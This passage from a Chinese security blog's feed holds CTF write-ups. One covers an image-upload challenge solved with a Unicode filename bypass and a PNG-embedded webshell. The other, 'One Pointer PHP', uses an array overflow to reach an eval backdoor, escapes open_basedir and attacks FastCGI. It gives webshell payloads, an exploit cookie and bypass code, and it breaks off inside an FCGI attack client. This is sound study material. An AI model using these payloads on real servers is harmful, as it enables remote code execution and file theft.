            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-15-image-20210515213117458.png" alt="image-20210515213117458"></p>
<h3 id="upload-">upload ×</h3>
<p>初始路由是一个上传页面</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;upload&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;这么大个的东西你是想d我吗？&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;如果不能好好传图片的话就还是不要来打扰我了&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;东西不能方方正正的话就很讨厌&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$fileName</span><span class="o">=</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;i&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;h&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">stristr</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">,</span><span class="s2">&#34;ph&#34;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;有些东西让你传上去的话那可不得了&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$imagePath</span> <span class="o">=</span> <span class="s2">&#34;image/&#34;</span> <span class="o">.</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="nv">$fileName</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;postedFile&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$imagePath</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&#34;upload success, image at </span><span class="si">$imagePath</span><span class="s2">&#34;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;传都没有传上去&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p><code>example.php</code>下应该是对zip的解压缩。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">]))</span>
    <span class="nv">$ctf</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;ctf&#34;</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$ctf</span><span class="o">==</span><span class="s2">&#34;poc&#34;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\ZipArchive</span><span class="p">();</span>
    <span class="nv">$name_for_zip</span> <span class="o">=</span> <span class="s2">&#34;example/&#34;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">)[</span><span class="nx">count</span><span class="p">(</span><span class="nx">explode</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="nv">$name_for_zip</span><span class="p">))</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">!==</span><span class="s2">&#34;zip&#34;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;要不咱们再看看？&#34;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">)</span> <span class="o">!==</span> <span class="k">TRUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span> <span class="p">(</span><span class="s2">&#34;都不能解压呢&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">echo</span> <span class="s2">&#34;可以解压，我想想存哪里&#34;</span><span class="p">;</span>
    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>

</code></pre></div><p>思路应该是绕过上传一个zip，然后解压得到php从而getshell。</p>
<p>比赛的时候对这个<code>imagecreatefrompng</code>始终没能绕过去，因为之前写图片马都是直接写到尾部，但是这里会被直接截断，需要用到一个工具。</p>
<p>上传对文件名有所限制,不能出现<strong>i</strong>,但是又用到了<code>mb_strtolower</code>,想到了之前p神出的codebreaking里面有关于js的<code>toUpperCase()</code> 与<code>toLowerCase()</code>特性，来php中试一试。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">echo</span> <span class="nx">mb_strtoupper</span><span class="p">(</span><span class="s2">&#34;ı&#34;</span><span class="p">);</span> <span class="c1">//I
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">mb_strtoupper</span><span class="p">(</span><span class="s2">&#34;ſ&#34;</span><span class="p">);</span> <span class="c1">//S
</span><span class="c1"></span>
<span class="k">echo</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="s2">&#34;İ&#34;</span><span class="p">);</span> <span class="c1">//i
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="s2">&#34;K&#34;</span><span class="p">);</span> <span class="c1">//k
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>可以看到都是ok的。这里题目还非常贴心的用了urldecode,那我们用<code>%c4%b0</code>即可。</p>
<p>下一步也就是要绕过图片尺寸，因为我们是明确了上传的是一个压缩包，里面含有一个php文件的图片马，这里可以用宏定义来直接绕过尺寸。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>这里我们随意创建一个zip文件，抓包尝试：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519160130742.png" alt="image-20210519160130742"></p>
<p>可以看到是成功绕过,那现在重新回归一下思路</p>
<ol>
<li>
<p>创建图片马</p>
</li>
<li>
<p>绕过图片尺寸 宏定义</p>
</li>
<li>
<p>添加至压缩文件,改后缀名为<code>z%c4%b0p</code>，绕过<code>i</code></p>
</li>
<li>
<p>在example.php处解压，访问马即可。</p>
</li>
</ol>
<p>这题的关键就是如何把我们的webshell隐藏在图片里，而不会被裁剪的时候删去。</p>
<p>结束后我翻到了这一篇12年<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">文章</a>&hellip;对应作者在github也有其<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">工具</a>。</p>
<p>但是原payload使用的payload为<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>,这种调用动态函数的方法在php5中是不可取的，需要修改。</p>
<p>payload使用的Huffman编码,在这个<a href="https://gchq.github.io/">网址</a>可以直接进行编码解码，修改我们的payload。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519171632231.png" alt="image-20210519171632231"></p>
<p>运行即可得到图片马,后续按如期操作即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519172210942.png" alt="image-20210519172210942"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519173821329.png" alt="image-20210519173821329"></p>
<p>还有一道类似Laravel Debug mode RCE（CVE-2021-3129）的题目,可惜自己对框架这一块一直没怎么注重,今天开始代码审计计划，给自己也挖一个坑,一周至少两个cms,一个月后去接触框架漏洞。</p>
]]></content>
		</item>
		
		<item>
			<title>蓝帽杯 One Pointer PHP</title>
			<link>https://theoyu.top/posts/bluehat/</link>
			<pubDate>Tue, 04 May 2021 21:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/bluehat/</guid>
			<description>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。
&amp;lt;?php class User{ public $count; } if($user=unserialize($_COOKIE[&amp;#34;data&amp;#34;])){ $count[++$user-&amp;gt;count]=1; if($count[]=1){ $user-&amp;gt;count+=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); }else{ eval($_GET[&amp;#34;backdoor&amp;#34;]); } }else{ $user=new User; $user-&amp;gt;count=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); } ?&amp;gt;题目给了源码，第一关是数组溢出，需要$count[]=1，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。
add_api.php?backdoor=eval($_POST[theoyu])；蚁剑设置Cookiedata=O%3a4%3a&amp;quot;User&amp;quot;%3a1%3a{s%3a5%3a&amp;quot;count&amp;quot;%3bi%3a9223372036854775806%3b}发现只能看当前目录，多半是open_basedir设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼phpinfo() &amp;hellip;
putenv 居然被过滤了！前几天还专门研究了这个，不过在phpinfo() 中发现Server API =FPM/FastCGI ，之前学SSRF 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了
好像没啥会的了，就尝试读一下配置文件，读取方式如下：
&amp;lt;?php mkdir(&amp;#39;theoyu&amp;#39;); chdir(&amp;#39;theoyu&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;..&amp;#39;); chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;/&amp;#39;); // 此处用来读目录 // $a = new DirectoryIterator(&amp;#34;glob:///etc/nginx/sites-enabled/*&amp;#34;); // foreach($a as $f){ // echo($f-&amp;gt;__toString().&amp;#39;&amp;lt;br&amp;gt;&amp;#39;); // }  //此处用来读文件 echo file_get_contents(&amp;#39;/etc/nginx/sites-enabled/default&amp;#39;); ?&amp;gt;这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&amp;hellip;然后就不会了&amp;hellip;
看wp发现师傅们用的是ftp 与 php-fpm 对话 RCE，具体可参考这一篇文章，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。
那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将fpmRCE的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。
fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</description>
			<content type="html"><![CDATA[<p>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
	<span class="k">public</span> <span class="nv">$count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">])){</span>
	<span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">count</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="p">){</span>
		<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">count</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
		<span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;backdoor&#34;</span><span class="p">]);</span>
	<span class="p">}</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="nv">$user</span><span class="o">=</span><span class="k">new</span> <span class="nx">User</span><span class="p">;</span>
	<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">count</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
	<span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>题目给了源码，第一关是数组溢出，需要<code>$count[]=1</code>，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。</p>
<pre><code>add_api.php?backdoor=eval($_POST[theoyu])；
蚁剑设置Cookie
data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a9223372036854775806%3b}
</code></pre><p>发现只能看当前目录，多半是<code>open_basedir</code>设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼<strong>phpinfo()</strong> &hellip;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505180925973.png" alt="image-20210505180925973"></p>
<p><strong>putenv</strong> 居然被过滤了！前几天还专门研究了这个，不过在<strong>phpinfo()</strong> 中发现<strong>Server API =FPM/FastCGI</strong> ，之前学<strong>SSRF</strong> 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了</p>
<p>好像没啥会的了，就尝试读一下配置文件，读取方式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>

<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>

<span class="c1">// 此处用来读目录
</span><span class="c1">// $a = new DirectoryIterator(&#34;glob:///etc/nginx/sites-enabled/*&#34;);
</span><span class="c1">// foreach($a as $f){
</span><span class="c1">//     echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
</span><span class="c1">// }
</span><span class="c1"></span>
<span class="c1">//此处用来读文件
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/nginx/sites-enabled/default&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&hellip;然后就不会了&hellip;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505162441456.png" alt="image-20210505162441456"></p>
<p>看wp发现师傅们用的是<strong>ftp 与 php-fpm 对话 RCE</strong>，具体可参考<a href="https://www.anquanke.com/post/id/233454">这一篇文章</a>，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。</p>
<p>那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将<strong>fpmRCE</strong>的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。</p>
<p><strong>fastcgi</strong> 的攻击脚本有php和go的，经过测试都可以运行，在<strong>php_value</strong> 处把<strong>disable_function</strong>置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">FCGIClient</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="no">VERSION_1</span>            <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">BEGIN_REQUEST</span>        <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">ABORT_REQUEST</span>        <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">END_REQUEST</span>          <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">PARAMS</span>               <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STDIN</span>                <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STDOUT</span>               <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STDERR</span>               <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">DATA</span>                 <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">GET_VALUES</span>           <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">GET_VALUES_RESULT</span>    <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">UNKNOWN_TYPE</span>         <span class="o">=</span> <span class="mi">11</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MAXTYPE</span>              <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">UNKNOWN_TYPE</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">RESPONDER</span>            <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">AUTHORIZER</span>           <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">FILTER</span>               <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">REQUEST_COMPLETE</span>     <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">CANT_MPX_CONN</span>        <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">OVERLOADED</span>           <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">UNKNOWN_ROLE</span>         <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MAX_CONNS</span>            <span class="o">=</span> <span class="s1">&#39;MAX_CONNS&#39;</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MAX_REQS</span>             <span class="o">=</span> <span class="s1">&#39;MAX_REQS&#39;</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MPXS_CONNS</span>           <span class="o">=</span> <span class="s1">&#39;MPXS_CONNS&#39;</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">HEADER_LEN</span>           <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_sock</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_host</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_port</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_keepAlive</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">9001</span><span class="p">)</span> <span class="c1">// and default value for port, just for unixdomain socket
</span><span class="c1"></span>    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_host</span> <span class="o">=</span> <span class="nv">$host</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_port</span> <span class="o">=</span> <span class="nv">$port</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setKeepAlive</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span> <span class="o">=</span> <span class="p">(</span><span class="nx">boolean</span><span class="p">)</span><span class="nv">$b</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getKeepAlive</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">connect</span><span class="p">()</span>
    <span class="p">{</span>
